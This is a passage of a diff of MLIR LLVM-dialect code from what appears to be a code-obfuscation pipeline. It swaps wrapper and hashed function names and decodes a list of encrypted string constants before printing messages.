-    %32 = llvm.call @__obfs_wrap_jocky_str_concat(%30, %31) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%32) : (!llvm.ptr) -> ()
+    %32 = llvm.call @jocky_str_concat(%30, %31) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%32) : (!llvm.ptr) -> ()
     %33 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    llvm.call @__obfs_wrap_println(%33) : (!llvm.ptr) -> ()
-    %34 = llvm.call @f_42fc974f80dc() : () -> i1
+    llvm.call @println(%33) : (!llvm.ptr) -> ()
+    %34 = llvm.call @f_0218a827() : () -> i1
     llvm.store %34, %27 {alignment = 1 : i64} : i1, !llvm.ptr
     %35 = llvm.load %27 {alignment = 1 : i64} : !llvm.ptr -> i1
     %36 = llvm.xor %35, %6 : i1
     llvm.cond_br %36, ^bb1, ^bb4
   ^bb1:  // pred: ^bb0
     %37 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<47 x i8>
-    llvm.call @__obfs_wrap_println(%37) : (!llvm.ptr) -> ()
-    %38 = llvm.call @f_4837c8659494() : () -> i1
+    llvm.call @println(%37) : (!llvm.ptr) -> ()
+    %38 = llvm.call @f_c1c92895() : () -> i1
     %39 = llvm.xor %38, %6 : i1
     llvm.cond_br %39, ^bb2, ^bb3
   ^bb2:  // pred: ^bb1
     %40 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<57 x i8>
-    llvm.call @__obfs_wrap_println(%40) : (!llvm.ptr) -> ()
+    llvm.call @println(%40) : (!llvm.ptr) -> ()
     llvm.br ^bb3
   ^bb3:  // 2 preds: ^bb1, ^bb2
     llvm.br ^bb4
   ^bb4:  // 2 preds: ^bb0, ^bb3
     %41 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    llvm.call @__obfs_wrap_println(%41) : (!llvm.ptr) -> ()
-    %42 = llvm.call @f_81f4df11aecf() : () -> i1
+    llvm.call @println(%41) : (!llvm.ptr) -> ()
+    %42 = llvm.call @f_b610cf36() : () -> i1
     %43 = llvm.xor %42, %6 : i1
     llvm.cond_br %43, ^bb5, ^bb6
   ^bb5:  // pred: ^bb4
     %44 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<58 x i8>
-    llvm.call @__obfs_wrap_println(%44) : (!llvm.ptr) -> ()
+    llvm.call @println(%44) : (!llvm.ptr) -> ()
     llvm.br ^bb6
   ^bb6:  // 2 preds: ^bb4, ^bb5
     %45 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    llvm.call @__obfs_wrap_println(%45) : (!llvm.ptr) -> ()
-    %46 = llvm.call @f_8ec13d7c68d1() : () -> i1
+    llvm.call @println(%45) : (!llvm.ptr) -> ()
+    %46 = llvm.call @f_97a724e0() : () -> i1
     %47 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    llvm.call @__obfs_wrap_println(%47) : (!llvm.ptr) -> ()
+    llvm.call @println(%47) : (!llvm.ptr) -> ()
     %48 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
-    llvm.call @__obfs_wrap_println(%48) : (!llvm.ptr) -> ()
+    llvm.call @println(%48) : (!llvm.ptr) -> ()
     %49 = llvm.getelementptr %11[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
     %50 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    %51 = llvm.call @__obfs_wrap_jocky_str_concat(%49, %50) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%51) : (!llvm.ptr) -> ()
+    %51 = llvm.call @jocky_str_concat(%49, %50) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%51) : (!llvm.ptr) -> ()
     %52 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
     %53 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    %54 = llvm.call @__obfs_wrap_jocky_str_concat(%52, %53) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%54) : (!llvm.ptr) -> ()
+    %54 = llvm.call @jocky_str_concat(%52, %53) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%54) : (!llvm.ptr) -> ()
     %55 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<12 x i8>
     %56 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
-    %57 = llvm.call @__obfs_wrap_jocky_str_concat(%55, %56) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%57) : (!llvm.ptr) -> ()
+    %57 = llvm.call @jocky_str_concat(%55, %56) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%57) : (!llvm.ptr) -> ()
     %58 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    llvm.call @__obfs_wrap_println(%58) : (!llvm.ptr) -> ()
+    llvm.call @println(%58) : (!llvm.ptr) -> ()
     %59 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<44 x i8>
-    llvm.call @__obfs_wrap_println(%59) : (!llvm.ptr) -> ()
+    llvm.call @println(%59) : (!llvm.ptr) -> ()
     %60 = llvm.getelementptr %15[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<54 x i8>
-    llvm.call @__obfs_wrap_println(%60) : (!llvm.ptr) -> ()
+    llvm.call @println(%60) : (!llvm.ptr) -> ()
     %61 = llvm.getelementptr %16[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<47 x i8>
-    llvm.call @__obfs_wrap_println(%61) : (!llvm.ptr) -> ()
+    llvm.call @println(%61) : (!llvm.ptr) -> ()
     %62 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<34 x i8>
-    llvm.call @__obfs_wrap_println(%62) : (!llvm.ptr) -> ()
+    llvm.call @println(%62) : (!llvm.ptr) -> ()
     %63 = llvm.getelementptr %18[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<53 x i8>
-    llvm.call @__obfs_wrap_println(%63) : (!llvm.ptr) -> ()
+    llvm.call @println(%63) : (!llvm.ptr) -> ()
     %64 = llvm.getelementptr %19[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<47 x i8>
-    llvm.call @__obfs_wrap_println(%64) : (!llvm.ptr) -> ()
+    llvm.call @println(%64) : (!llvm.ptr) -> ()
     %65 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    llvm.call @__obfs_wrap_println(%65) : (!llvm.ptr) -> ()
+    llvm.call @println(%65) : (!llvm.ptr) -> ()
     %66 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
-    llvm.call @__obfs_wrap_println(%66) : (!llvm.ptr) -> ()
+    llvm.call @println(%66) : (!llvm.ptr) -> ()
     %67 = llvm.getelementptr %21[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<28 x i8>
     %68 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    %69 = llvm.call @__obfs_wrap_jocky_str_concat(%67, %68) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%69) : (!llvm.ptr) -> ()
+    %69 = llvm.call @jocky_str_concat(%67, %68) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%69) : (!llvm.ptr) -> ()
     %70 = llvm.getelementptr %22[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<17 x i8>
     %71 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    %72 = llvm.call @__obfs_wrap_jocky_str_concat(%70, %71) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
-    llvm.call @__obfs_wrap_println(%72) : (!llvm.ptr) -> ()
+    %72 = llvm.call @jocky_str_concat(%70, %71) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
+    llvm.call @println(%72) : (!llvm.ptr) -> ()
     %73 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    llvm.call @__obfs_wrap_println(%73) : (!llvm.ptr) -> ()
+    llvm.call @println(%73) : (!llvm.ptr) -> ()
     %74 = llvm.getelementptr %23[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<52 x i8>
-    llvm.call @__obfs_wrap_println(%74) : (!llvm.ptr) -> ()
-    %75 = llvm.call @f_20b3ef7cd0d6() : () -> i1
+    llvm.call @println(%74) : (!llvm.ptr) -> ()
+    %75 = llvm.call @f_fe69c41f() : () -> i1
     llvm.store %75, %28 {alignment = 1 : i64} : i1, !llvm.ptr
     %76 = llvm.load %28 {alignment = 1 : i64} : !llvm.ptr -> i1
     llvm.cond_br %76, ^bb7, ^bb8
   ^bb7:  // pred: ^bb6
     %77 = llvm.getelementptr %25[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<59 x i8>
-    llvm.call @__obfs_wrap_println(%77) : (!llvm.ptr) -> ()
+    llvm.call @println(%77) : (!llvm.ptr) -> ()
     llvm.br ^bb9
   ^bb8:  // pred: ^bb6
     %78 = llvm.getelementptr %24[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<52 x i8>
-    llvm.call @__obfs_wrap_println(%78) : (!llvm.ptr) -> ()
+    llvm.call @println(%78) : (!llvm.ptr) -> ()
     llvm.br ^bb9
   ^bb9:  // 2 preds: ^bb7, ^bb8
     %79 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
-    llvm.call @__obfs_wrap_println(%79) : (!llvm.ptr) -> ()
+    llvm.call @println(%79) : (!llvm.ptr) -> ()
     %80 = llvm.getelementptr %26[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<44 x i8>
-    llvm.call @__obfs_wrap_println(%80) : (!llvm.ptr) -> ()
-    llvm.call @__obfs_wrap_jocky_sleep_and_recheck() : () -> ()
+    llvm.call @println(%80) : (!llvm.ptr) -> ()
+    llvm.call @jocky_sleep_and_recheck() : () -> ()
     llvm.return
   }
-  llvm.func internal @f_e5af34996946() attributes {no_inline} {
+  llvm.func internal @f_53decde1() attributes {no_inline} {
     %0 = llvm.mlir.addressof @".str.0.enc" : !llvm.ptr
     %1 = llvm.mlir.constant(54 : i64) : i64
-    %2 = llvm.call @f_658275b5bcb4(%0, %1) : (!llvm.ptr, i64) -> !llvm.ptr
+    %2 = llvm.call @f_61ae7c24(%0, %1) : (!llvm.ptr, i64) -> !llvm.ptr
     %3 = llvm.mlir.addressof @".str.1.enc" : !llvm.ptr
     %4 = llvm.mlir.constant(29 : i64) : i64
-    %5 = llvm.call @f_658275b5bcb4(%3, %4) : (!llvm.ptr, i64) -> !llvm.ptr
+    %5 = llvm.call @f_61ae7c24(%3, %4) : (!llvm.ptr, i64) -> !llvm.ptr
     %6 = llvm.mlir.addressof @".str.2.enc" : !llvm.ptr
     %7 = llvm.mlir.constant(1 : i64) : i64
-    %8 = llvm.call @f_658275b5bcb4(%6, %7) : (!llvm.ptr, i64) -> !llvm.ptr
+    %8 = llvm.call @f_61ae7c24(%6, %7) : (!llvm.ptr, i64) -> !llvm.ptr
     %9 = llvm.mlir.addressof @".str.3.enc" : !llvm.ptr
     %10 = llvm.mlir.constant(42 : i64) : i64
-    %11 = llvm.call @f_658275b5bcb4(%9, %10) : (!llvm.ptr, i64) -> !llvm.ptr
+    %11 = llvm.call @f_61ae7c24(%9, %10) : (!llvm.ptr, i64) -> !llvm.ptr
     %12 = llvm.mlir.addressof @".str.4.enc" : !llvm.ptr
     %13 = llvm.mlir.constant(37 : i64) : i64
-    %14 = llvm.call @f_658275b5bcb4(%12, %13) : (!llvm.ptr, i64) -> !llvm.ptr
+    %14 = llvm.call @f_61ae7c24(%12, %13) : (!llvm.ptr, i64) -> !llvm.ptr
     %15 = llvm.mlir.addressof @".str.5.enc" : !llvm.ptr
     %16 = llvm.mlir.constant(46 : i64) : i64
-    %17 = llvm.call @f_658275b5bcb4(%15, %16) : (!llvm.ptr, i64) -> !llvm.ptr
+    %17 = llvm.call @f_61ae7c24(%15, %16) : (!llvm.ptr, i64) -> !llvm.ptr
     %18 = llvm.mlir.addressof @".str.6.enc" : !llvm.ptr
     %19 = llvm.mlir.constant(30 : i64) : i64
-    %20 = llvm.call @f_658275b5bcb4(%18, %19) : (!llvm.ptr, i64) -> !llvm.ptr
+    %20 = llvm.call @f_61ae7c24(%18, %19) : (!llvm.ptr, i64) -> !llvm.ptr
     %21 = llvm.mlir.addressof @".str.7.enc" : !llvm.ptr
     %22 = llvm.mlir.constant(30 : i64) : i64
-    %23 = llvm.call @f_658275b5bcb4(%21, %22) : (!llvm.ptr, i64) -> !llvm.ptr
+    %23 = llvm.call @f_61ae7c24(%21, %22) : (!llvm.ptr, i64) -> !llvm.ptr
     %24 = llvm.mlir.addressof @".str.8.enc" : !llvm.ptr
     %25 = llvm.mlir.constant(46 : i64) : i64
-    %26 = llvm.call @f_658275b5bcb4(%24, %25) : (!llvm.ptr, i64) -> !llvm.ptr
+    %26 = llvm.call @f_61ae7c24(%24, %25) : (!llvm.ptr, i64) -> !llvm.ptr
     %27 = llvm.mlir.addressof @".str.9.enc" : !llvm.ptr
     %28 = llvm.mlir.constant(62 : i64) : i64
-    %29 = llvm.call @f_658275b5bcb4(%27, %28) : (!llvm.ptr, i64) -> !llvm.ptr
+    %29 = llvm.call @f_61ae7c24(%27, %28) : (!llvm.ptr, i64) -> !llvm.ptr
     %30 = llvm.mlir.addressof @".str.10.enc" : !llvm.ptr
     %31 = llvm.mlir.constant(29 : i64) : i64
-    %32 = llvm.call @f_658275b5bcb4(%30, %31) : (!llvm.ptr, i64) -> !llvm.ptr
+    %32 = llvm.call @f_61ae7c24(%30, %31) : (!llvm.ptr, i64) -> !llvm.ptr
     %33 = llvm.mlir.addressof @".str.11.enc" : !llvm.ptr
     %34 = llvm.mlir.constant(38 : i64) : i64
-    %35 = llvm.call @f_658275b5bcb4(%33, %34) : (!llvm.ptr, i64) -> !llvm.ptr
+    %35 = llvm.call @f_61ae7c24(%33, %34) : (!llvm.ptr, i64) -> !llvm.ptr
     %36 = llvm.mlir.addressof @".str.12.enc" : !llvm.ptr
     %37 = llvm.mlir.constant(29 : i64) : i64
-    %38 = llvm.call @f_658275b5bcb4(%36, %37) : (!llvm.ptr, i64) -> !llvm.ptr
+    %38 = llvm.call @f_61ae7c24(%36, %37) : (!llvm.ptr, i64) -> !llvm.ptr
     %39 = llvm.mlir.addressof @".str.13.enc" : !llvm.ptr
     %40 = llvm.mlir.constant(19 : i64) : i64
-    %41 = llvm.call @f_658275b5bcb4(%39, %40) : (!llvm.ptr, i64) -> !llvm.ptr
+    %41 = llvm.call @f_61ae7c24(%39, %40) : (!llvm.ptr, i64) -> !llvm.ptr
     %42 = llvm.mlir.addressof @".str.14.enc" : !llvm.ptr
     %43 = llvm.mlir.constant(36 : i64) : i64
-    %44 = llvm.call @f_658275b5bcb4(%42, %43) : (!llvm.ptr, i64) -> !llvm.ptr
+    %44 = llvm.call @f_61ae7c24(%42, %43) : (!llvm.ptr, i64) -> !llvm.ptr
     %45 = llvm.mlir.addressof @".str.15.enc" : !llvm.ptr
     %46 = llvm.mlir.constant(35 : i64) : i64
-    %47 = llvm.call @f_658275b5bcb4(%45, %46) : (!llvm.ptr, i64) -> !llvm.ptr
+    %47 = llvm.call @f_61ae7c24(%45, %46) : (!llvm.ptr, i64) -> !llvm.ptr
     %48 = llvm.mlir.addressof @".str.16.enc" : !llvm.ptr
     %49 = llvm.mlir.constant(30 : i64) : i64
-    %50 = llvm.call @f_658275b5bcb4(%48, %49) : (!llvm.ptr, i64) -> !llvm.ptr
+    %50 = llvm.call @f_61ae7c24(%48, %49) : (!llvm.ptr, i64) -> !llvm.ptr
     %51 = llvm.mlir.addressof @".str.17.enc" : !llvm.ptr
     %52 = llvm.mlir.constant(7 : i64) : i64
-    %53 = llvm.call @f_658275b5bcb4(%51, %52) : (!llvm.ptr, i64) -> !llvm.ptr
+    %53 = llvm.call @f_61ae7c24(%51, %52) : (!llvm.ptr, i64) -> !llvm.ptr
     %54 = llvm.mlir.addressof @".str.18.enc" : !llvm.ptr
     %55 = llvm.mlir.constant(56 : i64) : i64
-    %56 = llvm.call @f_658275b5bcb4(%54, %55) : (!llvm.ptr, i64) -> !llvm.ptr
+    %56 = llvm.call @f_61ae7c24(%54, %55) : (!llvm.ptr, i64) -> !llvm.ptr
     %57 = llvm.mlir.addressof @".str.19.enc" : !llvm.ptr
     %58 = llvm.mlir.constant(29 : i64) : i64
-    %59 = llvm.call @f_658275b5bcb4(%57, %58) : (!llvm.ptr, i64) -> !llvm.ptr
+    %59 = llvm.call @f_61ae7c24(%57, %58) : (!llvm.ptr, i64) -> !llvm.ptr
     %60 = llvm.mlir.addressof @".str.20.enc" : !llvm.ptr
     %61 = llvm.mlir.constant(26 : i64) : i64
-    %62 = llvm.call @f_658275b5bcb4(%60, %61) : (!llvm.ptr, i64) -> !llvm.ptr
+    %62 = llvm.call @f_61ae7c24(%60, %61) : (!llvm.ptr, i64) -> !llvm.ptr
     %63 = llvm.mlir.addressof @".str.21.enc" : !llvm.ptr
     %64 = llvm.mlir.constant(27 : i64) : i64
-    %65 = llvm.call @f_658275b5bcb4(%63, %64) : (!llvm.ptr, i64) -> !llvm.ptr
+    %65 = llvm.call @f_61ae7c24(%63, %64) : (!llvm.ptr, i64) -> !llvm.ptr
     %66 = llvm.mlir.addressof @".str.22.enc" : !llvm.ptr
     %67 = llvm.mlir.constant(33 : i64) : i64
-    %68 = llvm.call @f_658275b5bcb4(%66, %67) : (!llvm.ptr, i64) -> !llvm.ptr
+    %68 = llvm.call @f_61ae7c24(%66, %67) : (!llvm.ptr, i64) -> !llvm.ptr
     %69 = llvm.mlir.addressof @".str.23.enc" : !llvm.ptr
     %70 = llvm.mlir.constant(37 : i64) : i64
-    %71 = llvm.call @f_658275b5bcb4(%69, %70) : (!llvm.ptr, i64) -> !llvm.ptr
+    %71 = llvm.call @f_61ae7c24(%69, %70) : (!llvm.ptr, i64) -> !llvm.ptr
     %72 = llvm.mlir.addressof @".str.24.enc" : !llvm.ptr
     %73 = llvm.mlir.constant(27 : i64) : i64
-    %74 = llvm.call @f_658275b5bcb4(%72, %73) : (!llvm.ptr, i64) -> !llvm.ptr
+    %74 = llvm.call @f_61ae7c24(%72, %73) : (!llvm.ptr, i64) -> !llvm.ptr
     %75 = llvm.mlir.addressof @".str.25.enc" : !llvm.ptr
     %76 = llvm.mlir.constant(30 : i64) : i64
-    %77 = llvm.call @f_658275b5bcb4(%75, %76) : (!llvm.ptr, i64) -> !llvm.ptr
+    %77 = llvm.call @f_61ae7c24(%75, %76) : (!llvm.ptr, i64) -> !llvm.ptr
     %78 = llvm.mlir.addressof @".str.26.enc" : !llvm.ptr
     %79 = llvm.mlir.constant(36 : i64) : i64
-    %80 = llvm.call @f_658275b5bcb4(%78, %79) : (!llvm.ptr, i64) -> !llvm.ptr
+    %80 = llvm.call @f_61ae7c24(%78, %79) : (!llvm.ptr, i64) -> !llvm.ptr
     %81 = llvm.mlir.addressof @".str.27.enc" : !llvm.ptr
     %82 = llvm.mlir.constant(31 : i64) : i64
-    %83 = llvm.call @f_658275b5bcb4(%81, %82) : (!llvm.ptr, i64) -> !llvm.ptr
+    %83 = llvm.call @f_61ae7c24(%81, %82) : (!llvm.ptr, i64) -> !llvm.ptr
     %84 = llvm.mlir.addressof @".str.28.enc" : !llvm.ptr
     %85 = llvm.mlir.constant(20 : i64) : i64
-    %86 = llvm.call @f_658275b5bcb4(%84, %85) : (!llvm.ptr, i64) -> !llvm.ptr
+    %86 = llvm.call @f_61ae7c24(%84, %85) : (!llvm.ptr, i64) -> !llvm.ptr
     %87 = llvm.mlir.addressof @".str.29.enc" : !llvm.ptr
     %88 = llvm.mlir.constant(45 : i64) : i64
-    %89 = llvm.call @f_658275b5bcb4(%87, %88) : (!llvm.ptr, i64) -> !llvm.ptr
+    %89 = llvm.call @f_61ae7c24(%87, %88) : (!llvm.ptr, i64) -> !llvm.ptr
     %90 = llvm.mlir.addressof @".str.30.enc" : !llvm.ptr
     %91 = llvm.mlir.constant(21 : i64) : i64
-    %92 = llvm.call @f_658275b5bcb4(%90, %91) : (!llvm.ptr, i64) -> !llvm.ptr
+    %92 = llvm.call @f_61ae7c24(%90, %91) : (!llvm.ptr, i64) -> !llvm.ptr
     %93 = llvm.mlir.addressof @".str.31.enc" : !llvm.ptr
     %94 = llvm.mlir.constant(4 : i64) : i64
-    %95 = llvm.call @f_658275b5bcb4(%93, %94) : (!llvm.ptr, i64) -> !llvm.ptr
+    %95 = llvm.call @f_61ae7c24(%93, %94) : (!llvm.ptr, i64) -> !llvm.ptr
     %96 = llvm.mlir.addressof @".str.32.enc" : !llvm.ptr
     %97 = llvm.mlir.constant(2 : i64) : i64
-    %98 = llvm.call @f_658275b5bcb4(%96, %97) : (!llvm.ptr, i64) -> !llvm.ptr
+    %98 = llvm.call @f_61ae7c24(%96, %97) : (!llvm.ptr, i64) -> !llvm.ptr
     %99 = llvm.mlir.addressof @".str.33.enc" : !llvm.ptr
     %100 = llvm.mlir.constant(3 : i64) : i64
-    %101 = llvm.call @f_658275b5bcb4(%99, %100) : (!llvm.ptr, i64) -> !llvm.ptr
+    %101 = llvm.call @f_61ae7c24(%99, %100) : (!llvm.ptr, i64) -> !llvm.ptr
     %102 = llvm.mlir.addressof @".str.34.enc" : !llvm.ptr
     %103 = llvm.mlir.constant(28 : i64) : i64
-    %104 = llvm.call @f_658275b5bcb4(%102, %103) : (!llvm.ptr, i64) -> !llvm.ptr
+    %104 = llvm.call @f_61ae7c24(%102, %103) : (!llvm.ptr, i64) -> !llvm.ptr
     %105 = llvm.mlir.addressof @".str.35.enc" : !llvm.ptr
     %106 = llvm.mlir.constant(19 : i64) : i64
-    %107 = llvm.call @f_658275b5bcb4(%105, %106) : (!llvm.ptr, i64) -> !llvm.ptr
+    %107 = llvm.call @f_61ae7c24(%105, %106) : (!llvm.ptr, i64) -> !llvm.ptr
     %108 = llvm.mlir.addressof @".str.36.enc" : !llvm.ptr
     %109 = llvm.mlir.constant(52 : i64) : i64
-    %110 = llvm.call @f_658275b5bcb4(%108, %109) : (!llvm.ptr, i64) -> !llvm.ptr
+    %110 = llvm.call @f_61ae7c24(%108, %109) : (!llvm.ptr, i64) -> !llvm.ptr
     %111 = llvm.mlir.addressof @".str.37.enc" : !llvm.ptr
     %112 = llvm.mlir.constant(34 : i64) : i64
-    %113 = llvm.call @f_658275b5bcb4(%111, %112) : (!llvm.ptr, i64) -> !llvm.ptr
+    %113 = llvm.call @f_61ae7c24(%111, %112) : (!llvm.ptr, i64) -> !llvm.ptr
     %114 = llvm.mlir.addressof @".str.38.enc" : !llvm.ptr
     %115 = llvm.mlir.constant(50 : i64) : i64
-    %116 = llvm.call @f_658275b5bcb4(%114, %115) : (!llvm.ptr, i64) -> !llvm.ptr
+    %116 = llvm.call @f_61ae7c24(%114, %115) : (!llvm.ptr, i64) -> !llvm.ptr
     %117 = llvm.mlir.addressof @".str.39.enc" : !llvm.ptr
     %118 = llvm.mlir.constant(45 : i64) : i64
-    %119 = llvm.call @f_658275b5bcb4(%117, %118) : (!llvm.ptr, i64) -> !llvm.ptr
+    %119 = llvm.call @f_61ae7c24(%117, %118) : (!llvm.ptr, i64) -> !llvm.ptr
     %120 = llvm.mlir.addressof @".str.40.enc" : !llvm.ptr
     %121 = llvm.mlir.constant(45 : i64) : i64
-    %122 = llvm.call @f_658275b5bcb4(%120, %121) : (!llvm.ptr, i64) -> !llvm.ptr
+    %122 = llvm.call @f_61ae7c24(%120, %121) : (!llvm.ptr, i64) -> !llvm.ptr
     %123 = llvm.mlir.addressof @".str.41.enc" : !llvm.ptr
     %124 = llvm.mlir.constant(53 : i64) : i64
-    %125 = llvm.call @f_658275b5bcb4(%123, %124) : (!llvm.ptr, i64) -> !llvm.ptr
+    %125 = llvm.call @f_61ae7c24(%123, %124) : (!llvm.ptr, i64) -> !llvm.ptr
     %126 = llvm.mlir.addressof @".str.42.enc" : !llvm.ptr
     %127 = llvm.mlir.constant(11 : i64) : i64
-    %128 = llvm.call @f_658275b5bcb4(%126, %127) : (!llvm.ptr, i64) -> !llvm.ptr
+    %128 = llvm.call @f_61ae7c24(%126, %127) : (!llvm.ptr, i64) -> !llvm.ptr
     %129 = llvm.mlir.addressof @".str.43.enc" : !llvm.ptr
     %130 = llvm.mlir.constant(27 : i64) : i64
-    %131 = llvm.call @f_658275b5bcb4(%129, %130) : (!llvm.ptr, i64) -> !llvm.ptr
+    %131 = llvm.call @f_61ae7c24(%129, %130) : (!llvm.ptr, i64) -> !llvm.ptr
     %132 = llvm.mlir.addressof @".str.44.enc" : !llvm.ptr
     %133 = llvm.mlir.constant(47 : i64) : i64
-    %134 = llvm.call @f_658275b5bcb4(%132, %133) : (!llvm.ptr, i64) -> !llvm.ptr
+    %134 = llvm.call @f_61ae7c24(%132, %133) : (!llvm.ptr, i64) -> !llvm.ptr
     %135 = llvm.mlir.addressof @".str.45.enc" : !llvm.ptr
     %136 = llvm.mlir.constant(57 : i64) : i64
-    %137 = llvm.call @f_658275b5bcb4(%135, %136) : (!llvm.ptr, i64) -> !llvm.ptr
+    %137 = llvm.call @f_61ae7c24(%135, %136) : (!llvm.ptr, i64) -> !llvm.ptr
     %138 = llvm.mlir.addressof @".str.46.enc" : !llvm.ptr
     %139 = llvm.mlir.constant(58 : i64) : i64
-    %140 = llvm.call @f_658275b5bcb4(%138, %139) : (!llvm.ptr, i64) -> !llvm.ptr
+    %140 = llvm.call @f_61ae7c24(%138, %139) : (!llvm.ptr, i64) -> !llvm.ptr
     %141 = llvm.mlir.addressof @".str.47.enc" : !llvm.ptr
     %142 = llvm.mlir.constant(27 : i64) : i64
-    %143 = llvm.call @f_658275b5bcb4(%141, %142) : (!llvm.ptr, i64) -> !llvm.ptr
+    %143 = llvm.call @f_61ae7c24(%141, %142) : (!llvm.ptr, i64) -> !llvm.ptr
     %144 = llvm.mlir.addressof @".str.48.enc" : !llvm.ptr
     %145 = llvm.mlir.constant(19 : i64) : i64
-    %146 = llvm.call @f_658275b5bcb4(%144, %145) : (!llvm.ptr, i64) -> !llvm.ptr
+    %146 = llvm.call @f_61ae7c24(%144, %145) : (!llvm.ptr, i64) -> !llvm.ptr
     %147 = llvm.mlir.addressof @".str.49.enc" : !llvm.ptr
     %148 = llvm.mlir.constant(17 : i64) : i64
-    %149 = llvm.call @f_658275b5bcb4(%147, %148) : (!llvm.ptr, i64) -> !llvm.ptr
+    %149 = llvm.call @f_61ae7c24(%147, %148) : (!llvm.ptr, i64) -> !llvm.ptr
     %150 = llvm.mlir.addressof @".str.50.enc" : !llvm.ptr
     %151 = llvm.mlir.constant(12 : i64) : i64
-    %152 = llvm.call @f_658275b5bcb4(%150, %151) : (!llvm.ptr, i64) -> !llvm.ptr
+    %152 = llvm.call @f_61ae7c24(%150, %151) : (!llvm.ptr, i64) -> !llvm.ptr
     %153 = llvm.mlir.addressof @".str.51.enc" : !llvm.ptr
     %154 = llvm.mlir.constant(44 : i64) : i64
-    %155 = llvm.call @f_658275b5bcb4(%153, %154) : (!llvm.ptr, i64) -> !llvm.ptr
+    %155 = llvm.call @f_61ae7c24(%153, %154) : (!llvm.ptr, i64) -> !llvm.ptr
     %156 = llvm.mlir.addressof @".str.52.enc" : !llvm.ptr
     %157 = llvm.mlir.constant(54 : i64) : i64
-    %158 = llvm.call @f_658275b5bcb4(%156, %157) : (!llvm.ptr, i64) -> !llvm.ptr
+    %158 = llvm.call @f_61ae7c24(%156, %157) : (!llvm.ptr, i64) -> !llvm.ptr
     %159 = llvm.mlir.addressof @".str.53.enc" : !llvm.ptr
     %160 = llvm.mlir.constant(47 : i64) : i64
-    %161 = llvm.call @f_658275b5bcb4(%159, %160) : (!llvm.ptr, i64) -> !llvm.ptr
+    %161 = llvm.call @f_61ae7c24(%159, %160) : (!llvm.ptr, i64) -> !llvm.ptr
     %162 = llvm.mlir.addressof @".str.54.enc" : !llvm.ptr
     %163 = llvm.mlir.constant(34 : i64) : i64
-    %164 = llvm.call @f_658275b5bcb4(%162, %163) : (!llvm.ptr, i64) -> !llvm.ptr
